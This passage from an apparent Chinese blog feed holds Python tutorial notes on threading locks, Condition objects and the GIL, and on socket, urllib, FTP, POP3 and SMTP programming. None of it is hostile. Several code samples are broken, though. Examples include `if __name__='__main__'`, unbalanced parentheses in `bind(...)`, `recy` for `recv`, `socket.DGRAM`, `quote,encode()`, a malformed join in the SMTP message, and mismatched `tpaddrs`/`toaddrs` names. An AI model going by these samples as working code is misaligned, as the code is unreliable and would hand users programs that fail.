class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">#拒绝交易</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-5秒</span>        prev<span class="token operator">=</span>Account<span class="token punctuation">.</span>amount        Account<span class="token punctuation">.</span>amount<span class="token operator">-=</span>a    <span class="token comment" spellcheck="true">#取款</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0}取款前余额：{1}，取款额：{2}，取款后额：{3}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>name<span class="token punctuation">,</span>prev<span class="token punctuation">,</span>a<span class="token punctuation">,</span>Account<span class="token punctuation">.</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span>        Account<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#释放锁。注释不使用同步处理</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#创建5个线程对象并启动</span>        Account<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">=</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604b8bae5a749.jpg" alt=""></p><h2 id="2-基于条件变量（Condition对象）的同步和通信"><a href="#2-基于条件变量（Condition对象）的同步和通信" class="headerlink" title="2. 基于条件变量（Condition对象）的同步和通信"></a>2. 基于条件变量（Condition对象）的同步和通信</h2><ul><li>Condition（条件变量）通常与一个锁关联。需要在多个Condition中共享一个锁时，可以传递一个Lock/RLock实例给构造方法，否则它将自己生成一个RLock实例。</li><li>除了Lock带有的锁定池外，Condition还包含一个等待池，池中的线程处于等待阻塞状态，直到另一线程调用notify()/notifyAll()通知；得到通知后线程进入锁定池等待锁定。</li><li>构造方法：Condition([lock/rlock])</li><li>实例方法：<ul><li>acquire([timeout])/release()：调用关联的锁的相应方法。</li><li>wait([timeout])：调用这个方法将使线程进入Condition的等待池等待通知，并释放锁。先释放获得的锁，然后阻塞，直到被唤醒或者超时，一旦被唤醒或者超时，会重新获取锁（应该说抢锁），然后返回。</li><li>notify()：从等待池挑选一个线程并通知，收到通知的线程将自动调用acquire()尝试获取锁定（进入锁定池）；其他线程仍然在等待池中。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。</li><li>notifyAll()：通知等待池中所有的线程，这些线程都将进入锁定池尝试获得锁定。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#题目：将10000000递减到0程序终止，用单线程来执行，完成时间是多少？用多线程又会是多少？</span><span class="token comment" spellcheck="true">#任务</span><span class="token keyword">def</span> <span class="token function">decr</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> n<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token operator">-=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#单线</span><span class="token keyword">import</span> time start<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>decr<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span>cost<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'单线程耗时：'</span><span class="token punctuation">,</span>cost<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#多线</span><span class="token keyword">import</span> threadingstart<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>decr<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">5000000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>decr<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">5000000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#主线程阻塞，直到t1执行完成，主线程继续往后执行</span>t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>cost<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'多线程耗时：'</span><span class="token punctuation">,</span>cost<span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604b8bae5b911.jpg" alt=""></p><p>（理论上多线程应该不快反慢的，这个结果…可能是因为python3.7对GIL机制进行了优化？）</p><p><strong>导致Python多线程不快反慢的原因：</strong></p><ul><li>在Cpython解释器（Python语言的主流解释器）中，有一把全局解释锁GIL（Global Interpreter Lock）</li><li>同一时刻，只有一个线程在运行，其它线程只能等待，即使是多核CPU，也没有办法让多个线程“并行”地同时执行代码，只能是交替执行，因为多线程涉及到上下文切换、锁机制处理（获取锁、释放锁等），所以，多线程执行不快反慢。</li></ul><p><strong>Python的应对：</strong></p><ul><li>多进程：multiprocessing标准库，让多进程的python程序编写简化到类似多线程的程度</li><li>计算密集性的程序用C代码编写并通过扩展的方式集成到Python脚本里（如NumPy模块）。在扩展里就完全可以用C创建原生线程，而且不用锁GIL</li><li>利用ctypes绕过GIL，让Python通过ctypes直接调用任意的C动态库的导出函数，ctypes会在调用C函数前释放GIL</li><li>更换解释器，如Jython、IronPython等无GIL解释器</li><li>使用python3.4或更高版本（对GIL机制进行了优化）</li><li>科学计算之类需要持续使用CPU的任务时，单线程会比多线程快<br>I- O操作等可能引起阻塞的任务（如爬取）时，多线程会比单线程快（遇到IO阻塞会自动释放GIL锁）<br>3/12/2021 11:54:53 PM </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python网络编程和通信</title>
      <link href="2021/03/11/python-wang-luo-bian-cheng-he-tong-xin/"/>
      <url>2021/03/11/python-wang-luo-bian-cheng-he-tong-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="一、基于SOCKET的网络编程"><a href="#一、基于SOCKET的网络编程" class="headerlink" title="一、基于SOCKET的网络编程"></a>一、基于SOCKET的网络编程</h1><p>套接字：网络中两个应用程序之间通信的端点</p><p><strong>基于套接字的TCPServer的网络编程一般包括以下基本步骤：</strong></p><p>（1）创建socket对象<br>（2）将socket绑定到指定地址上<br>（3）准备好套接字，以便接收连接请求<br>（4）通过socket对象方法accept，等待客户请求连接<br>（5）服务器和客户机通过send和recv方法通信（传输数据）<br>（6）传输结束，调用socket的close方法以关闭连接</p><p><strong>基于套接字的TCPClient的网络编程一般包括以下基本步骤：</strong></p><p>（1）创建socket对象<br>（2）通过socket对象方法connect连接服务器<br>（3）客户机和服务器通过send和recv方法通信（传输数据）<br>（4）传输结束，调用socket的close方法以关闭连接</p><p><strong>基于套接字的UDPServer的网络编程一般包括以下基本步骤：</strong><br>（UDP无连接数据包协议）</p><p>（1）创建socket对象<br>（2）将socket绑定到指定地址上<br>（3）服务器和客户机通过send和recv方法通信（传输数据）<br>（4）传输结束，调用socket的close方法以关闭连接</p><p><strong>基于套接字的UDPClient的网络编程一般包括以下基本步骤：</strong></p><p>（1）创建socket对象<br>（2）客户机和服务器通过send和recv方法通信（传输数据）<br>（3）传输结束，调用socket的close方法以关闭连接</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#题目——简单TCP程序：ECHO SERVER</span>基于TCP的Echo Server包括服务器<span class="token operator">/</span>客户机两个部分：服务端应用程序和客户机应用程序。服务端应用程序创建一个socket并绑定到某个IP地址：端口号上，然后侦听listen，并使用阻塞方法accept以等待客户机连接请求；客户机创建一个socket，并建立到服务器的连接；客户机循环接受用户数据并发送数据到服务器，服务器接收数据后回送（Echo）给客户机。客户机输入空数据时，关闭socket并终止运行；服务器接收到空数据时，关闭socket并终止运行。<span class="token comment" spellcheck="true">#服务端应用程序CHATSERVER   TCP</span><span class="token keyword">import</span> socketserversocket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建服务器socket</span>serversocket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定到IP地址和端口号</span>serversocket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#开始侦听，队列长度为1</span>clientsocket<span class="token punctuation">,</span>clientaddress<span class="token operator">=</span>serversocket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#使用阻塞方法accept以等待客户机连接请求</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connection from'</span><span class="token punctuation">,</span>clientaddress<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接受客户机请求后输出客户机的信息</span><span class="token keyword">while</span> <span class="token number">1</span> <span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环以接收和回送客户机数据</span>    data<span class="token operator">=</span>clientsocket<span class="token punctuation">.</span>recy<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收数据</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span> <span class="token keyword">break</span>    <span class="token comment" spellcheck="true">#接收到空数据时，终止循环</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Received from client:'</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出接收到的数据，repr函数转换为字符串</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Echo:'</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出发送到客户机数据的信息</span>    clientsocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回送数据到客户机</span>clientsocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭客户机socket</span>serversocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭服务器socket</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ChatServerUDP.py</span><span class="token keyword">import</span> socketserversocket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建服务器socket</span>serversocket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定到IP地址和端口号</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环以接收和回送客户机数据</span>    data<span class="token punctuation">,</span>address<span class="token operator">=</span>serversocket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收数据，返回数据和客户机地址</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span><span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#接收到空数据时，终止循环</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Received from client:'</span><span class="token punctuation">,</span>address<span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出接收到的数据，repr函数转换为字符串</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Echo:'</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出发送到客户机数据的信息</span>    serversocket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>data<span class="token punctuation">,</span>address<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#发送数据到客户机</span>serversocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭服务器socket</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#服务器应用程序QUOTESERVER</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>randomquotes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'不妄求，则心安，不妄做，则身安'</span><span class="token punctuation">,</span><span class="token string">'多门之室生风，多言之人生祸'</span><span class="token punctuation">,</span><span class="token string">'人之心胸，多欲则窄，寡欲则宽'</span><span class="token punctuation">,</span><span class="token string">'三人行，必有我师'</span><span class="token punctuation">,</span><span class="token string">'滴水穿石，磨杵成针'</span><span class="token punctuation">,</span><span class="token string">'是非天天有，不听自然无'</span><span class="token punctuation">,</span><span class="token string">'积德为产业，强胜于美宅良田'</span><span class="token punctuation">]</span>serversocket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>DGRAM<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建服务器socket</span>serversocket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8002</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定到IP地址和端口号</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环以接收和回送客户机数据</span>    data<span class="token punctuation">,</span>address<span class="token operator">=</span>serversocket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收数据，返回数据和客户机地址</span>    quote<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>quotes<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#从Quotes列表中随机选择一个项目</span>    serversocket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>quote<span class="token punctuation">,</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>address<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#把数据转换为bytes对象，并发送数据到客户机</span>serversocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭服务器socket</span></code></pre><h1 id="二、基于URLLIB的网络编程"><a href="#二、基于URLLIB的网络编程" class="headerlink" title="二、基于URLLIB的网络编程"></a>二、基于URLLIB的网络编程</h1><ul><li>urllib.request(打开和读取URL）</li><li>urllib.parse(解析URL)</li><li>urllib.error(urllib.request引发的异常)</li><li>urllib.robotparser(解析robots.txt文件)</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Request对象示例</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestf<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#打开URL资源</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取200个字节，返回bytes对象并输出</span>f<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#重新打开URL资源</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取200个字节，返回bytes对象，转换为字符串并输出</span><span class="token keyword">with</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com/'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#重新打开URL资源</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>'utf<span class="token number">-8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取返回bytes对象转换为字符串并输出</span></code></pre><p><strong>网站文件robots.txt</strong>(“robots协议”，并非规范，只是约定俗成的，并不能保证网站的隐私)：</p><p>告诉网络爬虫爬取该网站时存在哪些限制：存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。</p><pre class=" language-python"><code class="language-python"><span class="token operator">/</span><span class="token operator">*</span>创建REQUEST对象urllib<span class="token punctuation">.</span>request模块中Request对象的构造函数如下<span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>None<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> origin_req_host<span class="token operator">=</span>None<span class="token punctuation">,</span> unverifiable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> method<span class="token operator">=</span>None<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">def</span> <span class="token function">getURLInfo</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    req<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Request对象</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Full url:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>full_url<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#URL</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Host:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>host<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#主机和端口号</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#向服务器传送的数据</span><span class="token comment" spellcheck="true">#测试代码</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://www.baidu.com/s'</span>    values<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'wd'</span><span class="token punctuation">:</span><span class="token string">'python'</span><span class="token punctuation">}</span>    data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>    data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'UTF8'</span><span class="token punctuation">)</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/4.0(compatible;MSIE 5.5;Windows NT)'</span><span class="token punctuation">}</span>    getURLInfo<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604a3a405d054.jpg" alt=""></p><h1 id="三、基于HTTP的网络编程"><a href="#三、基于HTTP的网络编程" class="headerlink" title="三、基于HTTP的网络编程"></a>三、基于HTTP的网络编程</h1><ul><li>http.client （低级别的HTTP协议客户端，高级别的URL打开则使用urllib.request）</li><li>http.server （基于socketserver的HTTP服务器类）</li><li>http.cookies （使用cookies实现状态管理的工具）</li><li>http.cookiejar （提供cookies的持久性）</li></ul><h1 id="四、基于FTPLIB的网络编程"><a href="#四、基于FTPLIB的网络编程" class="headerlink" title="四、基于FTPLIB的网络编程"></a>四、基于FTPLIB的网络编程</h1><ul><li>创建FTP对象</li><li>创建FTP_TLS对象 （传输层安全协议）</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#创建FTP对象示例</span><span class="token keyword">from</span> ftplib <span class="token keyword">import</span> FTPftp<span class="token operator">=</span>FTP<span class="token punctuation">(</span><span class="token string">"ftp 1.at.proftpd.org"</span><span class="token punctuation">)</span>ftp<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#无参数则匿名登录</span>ftp<span class="token punctuation">.</span>dir<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#罗列目录</span>ftp<span class="token punctuation">.</span>cwd<span class="token punctuation">(</span><span class="token string">'devel'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#切换当前目录</span>ftp<span class="token punctuation">.</span>dir<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#创建FTP_TLS对象</span><span class="token keyword">from</span> ftplib <span class="token keyword">import</span> FTP_TLSftps<span class="token operator">=</span>FTP_TLS<span class="token punctuation">(</span><span class="token string">'ftp.python.org'</span><span class="token punctuation">)</span>ftps<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#匿名登录安全控制通道</span>ftps<span class="token punctuation">.</span>prot_p<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#安全数据连接（加密传输）</span>ftps<span class="token punctuation">.</span>retrlines<span class="token punctuation">(</span><span class="token string">'LIST'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#罗列目录清单</span>ftps<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#退出</span></code></pre><h1 id="五、基于POPLIB和SMTPLIB的网络编程"><a href="#五、基于POPLIB和SMTPLIB的网络编程" class="headerlink" title="五、基于POPLIB和SMTPLIB的网络编程"></a>五、基于POPLIB和SMTPLIB的网络编程</h1><ul><li>poplib模块提供了对POP3协议的支持</li><li>smtplib模块提供了对SMTP协议的支持</li><li>使用poplib和smtplib，可以实现接收和发送邮件的功能</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#POP3示例</span><span class="token keyword">import</span> getpass<span class="token punctuation">,</span>poplibhost<span class="token operator">=</span><span class="token string">'YourPop3Host'</span>    <span class="token comment" spellcheck="true">#POP3服务器的主机名或IP地址，运行时需修改为对应的值</span>port<span class="token operator">=</span><span class="token number">110</span>    <span class="token comment" spellcheck="true">#POP3服务器的端口号，默认为110，运行时需修改为对应的值</span>pop3<span class="token operator">=</span>poplib<span class="token punctuation">.</span>POP3<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token operator">=</span>port<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建POP3对象</span>pop3<span class="token punctuation">.</span>user<span class="token punctuation">(</span>getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用户名</span>pop3<span class="token punctuation">.</span>pass_<span class="token punctuation">(</span>getpass<span class="token punctuation">.</span>getpass<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#密码</span>numMessages<span class="token operator">=</span>len<span class="token punctuation">(</span>pop3<span class="token punctuation">.</span>list<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#邮件数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>numMessages<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#接收邮件</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> pop3<span class="token punctuation">.</span>retr<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#SMTP示例</span><span class="token keyword">import</span> smtplib<span class="token keyword">def</span> <span class="token function">prompt</span><span class="token punctuation">(</span>prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> input<span class="token punctuation">(</span>prompt<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>fromaddr<span class="token operator">=</span>prompt<span class="token punctuation">(</span><span class="token string">"From: "</span><span class="token punctuation">)</span>tpaddrs<span class="token operator">=</span>prompt<span class="token punctuation">(</span><span class="token string">"To: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入信息，^D(Unix) or ^Z(Windows)结束输入："</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#添加From: 和 To: 头信息</span>msg<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"From: %s\r\nTo: %s\r\n\r\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>fromaddr <span class="token string">"."</span> join<span class="token punctuation">(</span>toaddrs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        line<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> line<span class="token punctuation">:</span>        <span class="token keyword">break</span>    msg<span class="token operator">=</span>msg<span class="token operator">+</span>line<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"信息长度为："</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token operator">=</span>smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>set_debuglevel<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>fromaddr<span class="token punctuation">,</span>toaddrs<span class="token punctuation">,</span>msg<span class="token punctuation">)</span>server<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/11/2021 11:51:54 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python数据库访问</title>
